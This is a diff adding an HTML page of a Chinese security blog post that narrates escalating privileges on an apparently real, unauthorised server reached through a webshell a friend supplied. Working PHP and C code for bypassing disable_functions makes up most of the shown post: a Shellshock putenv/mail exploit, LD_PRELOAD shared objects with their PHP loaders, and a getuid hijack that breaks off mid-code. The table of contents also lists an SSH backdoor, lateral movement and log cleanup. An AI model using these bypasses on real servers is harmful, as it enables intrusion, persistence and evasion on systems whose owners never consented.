@@ -1,0 +1,1319 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>一次艰难的渗透提权过程 - F0rmat的博客-专注于网络安全、信息安全、内网渗透、红队攻防</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="F0rmat" />
+  <meta name="description" content="0x01 前言 某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。 Getshell的漏洞分析在:https://g" />
+
+  <meta name="keywords" content="渗透测试, 网络安全, F0rmat" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.91.2" />
+
+
+<link rel="canonical" href="https://xxe.icu/post/a-difficult-penetration-process/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.5227954e5327390ee2be2e9ddae8b96f1ada64bdf87e87b56b029198ec14dcde.css" integrity="sha256-UieVTlMnOQ7ivi6d2ui5bxraZL34foe1awKRmOwU3N4=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="一次艰难的渗透提权过程" />
+<meta property="og:description" content="0x01 前言 某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。 Getshell的漏洞分析在:https://g" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xxe.icu/post/a-difficult-penetration-process/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2019-09-09T02:11:19+00:00" />
+<meta property="article:modified_time" content="2019-09-09T02:11:19+00:00" />
+
+<meta itemprop="name" content="一次艰难的渗透提权过程">
+<meta itemprop="description" content="0x01 前言 某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。 Getshell的漏洞分析在:https://g"><meta itemprop="datePublished" content="2019-09-09T02:11:19+00:00" />
+<meta itemprop="dateModified" content="2019-09-09T02:11:19+00:00" />
+<meta itemprop="wordCount" content="3696">
+<meta itemprop="keywords" content="渗透测试,提权," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="一次艰难的渗透提权过程"/>
+<meta name="twitter:description" content="0x01 前言 某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。 Getshell的漏洞分析在:https://g"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">F0rmat's Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/categories/">目录</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      F0rmat's Blog
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://xxe.icu/categories/">目录</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">一次艰难的渗透提权过程</h1>
+      
+      <div class="post-meta">
+        <time datetime="2019-09-09" class="post-time">
+          2019-09-09
+        </time>
+        <div class="post-category">
+            <a href="https://xxe.icu/categories/%E6%B8%97%E9%80%8F/"> 渗透 </a>
+            
+          </div>
+        <span class="more-meta"> 约 3696 字 </span>
+          <span class="more-meta"> 预计阅读 8 分钟 </span>
+
+        
+        
+          <span id="busuanzi_container_page_pv">
+            | 阅读 <span id="busuanzi_value_page_pv"></span>
+          </span>
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-前言">0x01 前言</a></li>
+    <li><a href="#0x02-信息探测">0x02 信息探测</a></li>
+    <li><a href="#0x03-肝">0x03 肝</a></li>
+    <li><a href="#0x04-新希望-ld_preload">0x04 新希望 LD_PRELOAD</a></li>
+    <li><a href="#0x05-柳暗花明又一村-centos">0x05 柳暗花明又一村-centos</a>
+      <ul>
+        <li><a href="#劫持getuid">劫持getuid()</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x06-脏牛提权">0x06 脏牛提权</a></li>
+    <li><a href="#0x07-持续访问-ssh后门">0x07 持续访问-ssh后门</a></li>
+    <li><a href="#0x08-metaspliot-横向渗透">0x08 metaspliot 横向渗透</a></li>
+    <li><a href="#0x09-擦屁股">0x09 擦屁股</a></li>
+    <li><a href="#0x10-结束">0x10 结束</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      <h1 id="0x01-前言">0x01 前言</h1>
+<p>某日朋友丢了一条shell叫我提权，我拿到shell看了一下，菜刀蚁剑都无法执行命令。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/1.png" alt=""></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/2.png" alt=""></p>
+<p>Getshell的漏洞分析在:https://getpass.cn/2019/09/06/An-APP-distribution-system-upload-vulnerability/</p>
+<p>然后搞了好久熬了一个晚上才弄好，中间走了很多弯路。。。</p>
+<h1 id="0x02-信息探测">0x02 信息探测</h1>
+<p>上一个phpinfo看下环境</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">PHP Version 5.6.30
+disable_functions:
+passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru
+sendmail_path:/usr/sbin/sendmail -t -i
+mysql:	mysqlnd 5.0.11-dev - 20120503
+</code></pre></td></tr></table>
+</div>
+</div><p>宝塔警告！
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/3.png" alt=""></p>
+<p>问了宝塔的开发工程师，宝塔确实是做得挺好的，Windows的基本没什么希望了，看下Linux的。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/4.png" alt=""></p>
+<h1 id="0x03-肝">0x03 肝</h1>
+<p><code>putenv</code>这个没禁可以利用一下，看了P神的一篇文章：https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html
+<a href="http://www.exploit-db.com/exploits/35146/">http://www.exploit-db.com/exploits/35146/</a> 的POC</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
+<span class="c1"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
+</span><span class="c1"># Google Dork: none 
+</span><span class="c1"># Date: 10/31/2014 
+</span><span class="c1"># Exploit Author: Ryan King (Starfall) 
+</span><span class="c1"># Vendor Homepage: http://php.net 
+</span><span class="c1"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
+</span><span class="c1"># Version: 5.* (tested on 5.6.2) 
+</span><span class="c1"># Tested on: Debian 7 and CentOS 5 and 6 
+</span><span class="c1"># CVE: CVE-2014-6271 
+</span><span class="c1"></span>
+<span class="k">function</span> <span class="nf">shellshock</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Execute a command via CVE-2014-6271 @mail.c:283 
+</span><span class="c1"></span>   <span class="nv">$tmp</span> <span class="o">=</span> <span class="nx">tempnam</span><span class="p">(</span><span class="s2">&#34;.&#34;</span><span class="p">,</span><span class="s2">&#34;data&#34;</span><span class="p">);</span> 
+   <span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;PHP_LOL=() { x; }; </span><span class="si">$cmd</span><span class="s2"> &gt;</span><span class="si">$tmp</span><span class="s2"> 2&gt;&amp;1&#34;</span><span class="p">);</span> 
+   <span class="c1">// In Safe Mode, the user may only alter environment variableswhose names 
+</span><span class="c1"></span>   <span class="c1">// begin with the prefixes supplied by this directive. 
+</span><span class="c1"></span>   <span class="c1">// By default, users will only be able to set environment variablesthat 
+</span><span class="c1"></span>   <span class="c1">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
+</span><span class="c1"></span>   <span class="c1">// PHP will let the user modify ANY environment variable! 
+</span><span class="c1"></span>   <span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;a@127.0.0.1&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;-bv&#34;</span><span class="p">);</span> <span class="c1">// -bv so we don&#39;t actuallysend any mail 
+</span><span class="c1"></span>   <span class="nv">$output</span> <span class="o">=</span> <span class="o">@</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 
+   <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 
+   <span class="k">if</span><span class="p">(</span><span class="nv">$output</span> <span class="o">!=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span> 
+   <span class="k">else</span> <span class="k">return</span> <span class="s2">&#34;No output, or not vuln.&#34;</span><span class="p">;</span> 
+<span class="p">}</span> 
+<span class="k">echo</span> <span class="nx">shellshock</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span> 
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/5.png" alt=""></p>
+<p>没戏。。</p>
+<p>继续肝。。。</p>
+<h1 id="0x04-新希望-ld_preload">0x04 新希望 LD_PRELOAD</h1>
+<p>上gayhub上面搜了一下看到了一篇不错的姿势https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</p>
+<p>按照了里面的一段代码<code>bypass_disablefunc.c</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
+</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+
+<span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">preloadme</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;EVIL_CMDLINE&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>编译了一下
+然后上传调用文件php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&#34;</span><span class="p">;</span>
+
+    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">];</span>
+    <span class="nv">$out_path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;outpath&#34;</span><span class="p">];</span>
+    <span class="nv">$evil_cmdline</span> <span class="o">=</span> <span class="nv">$cmd</span> <span class="o">.</span> <span class="s2">&#34; &gt; &#34;</span> <span class="o">.</span> <span class="nv">$out_path</span> <span class="o">.</span> <span class="s2">&#34; 2&gt;&amp;1&#34;</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &#34;</span> <span class="o">.</span> <span class="nv">$evil_cmdline</span> <span class="o">.</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>
+
+    <span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;EVIL_CMDLINE=&#34;</span> <span class="o">.</span> <span class="nv">$evil_cmdline</span><span class="p">);</span>
+
+    <span class="nv">$so_path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;sopath&#34;</span><span class="p">];</span>
+    <span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD=&#34;</span> <span class="o">.</span> <span class="nv">$so_path</span><span class="p">);</span>
+
+    <span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">);</span>
+
+    <span class="k">echo</span> <span class="s2">&#34;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&#34;</span> <span class="o">.</span> <span class="nx">nl2br</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$out_path</span><span class="p">))</span> <span class="o">.</span> <span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span> 
+
+    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$out_path</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>利用的时候没回显，what？
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/6.png" alt=""></p>
+<p>又找了一篇文章：https://www.cnblogs.com/leixiao-/p/10612798.html
+还是利用unix的<code>LD_PRELOAD</code>和php的<code>putenv</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="kt">void</span> <span class="n">l3yx</span><span class="p">(){</span>
+    <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&#34;_evilcmd&#34;</span><span class="p">));</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>利用php文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;_evilcmd=echo 1&gt;/root/tmp/222222&#34;</span><span class="p">);</span>
+<span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD=./evil.so&#34;</span><span class="p">);</span>
+<span class="nx">mail</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>执行后去刷新了一下目录，！！！！我去，成功了！</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/7.png" alt=""></p>
+<p>但是这样执行代码总是有众多不便的，比如没有回显，把命令带参数执行的时候会报错等
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/8.png" alt=""></p>
+<p>还得继续。。。</p>
+<h1 id="0x05-柳暗花明又一村-centos">0x05 柳暗花明又一村-centos</h1>
+<p>看了大佬一篇文章https://www.meetsec.cn/index.php/archives/44/</p>
+<p>一个修复版的bypass.c,作者的解释：</p>
+<blockquote>
+<p>如果你是一个细心的人你会发现这里的bypass_disablefunc.c（来自github）和教程中提及的不一样，多出了使用for循环修改LD_PRELOAD的首个字符改成\0，如果你略微了解C语言就会知道\0是C语言字符串结束标记，原因注释里有：unsetenv(&ldquo;LD_PRELOAD&rdquo;)在某些Linux发行版不一定生效（如CentOS），这样一个小动作能够让系统原有的LD_PRELOAD环境变量自动失效</p>
+</blockquote>
+<p>然后从环境变量 EVIL_CMDLINE 中接收 bypass_disablefunc.php 传递过来的待执行的命令行。</p>
+<p>用命令 gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so 将 bypass_disablefunc.c 编译为共享对象 bypass_disablefunc_x64.so：</p>
+<p>要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define _GNU_SOURCE
+</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+
+<span class="k">extern</span> <span class="kt">char</span><span class="o">**</span> <span class="n">environ</span><span class="p">;</span>
+
+<span class="n">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="n">preload</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// get command line options and arg
+</span><span class="c1"></span>    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;EVIL_CMDLINE&#34;</span><span class="p">);</span>
+
+    <span class="c1">// unset environment variable LD_PRELOAD.
+</span><span class="c1"></span>    <span class="c1">// unsetenv(&#34;LD_PRELOAD&#34;) no effect on some 
+</span><span class="c1"></span>    <span class="c1">// distribution (e.g., centos), I need crafty trick.
+</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+            <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="c1">// executive command
+</span><span class="c1"></span>    <span class="n">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/9.png" alt=""></p>
+<p>偶~sex!
+后来作者确实改进了代码
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/a-difficult-penetration-process/10.png" alt="">
+中间也发现了一篇不错的方法：https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/</p>
+<h2 id="劫持getuid">劫持getuid()</h2>
+<p>基本原理
+前提是在Linux中已安装并启用sendmail程序。</p>
+<p>php的mail()函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，而/usr/sbin/sendmail会调用getuid()。如果我们能通过LD_PRELOAD的方式来劫持getuid()，再用mail()函数来触发sendmail程序进而执行被劫持的getuid()，从而就能执行恶意代码了。</p>
+<p>细化一下：</p>
+<p>编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 evil.so；
+运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 evil.so，以便后续启动新进程时优先加载该共享对象；
+运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 evil.so 中的同名 getuid() 所劫持；
+达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">geteuid</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;EVIL_CMDLINE&#34;</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
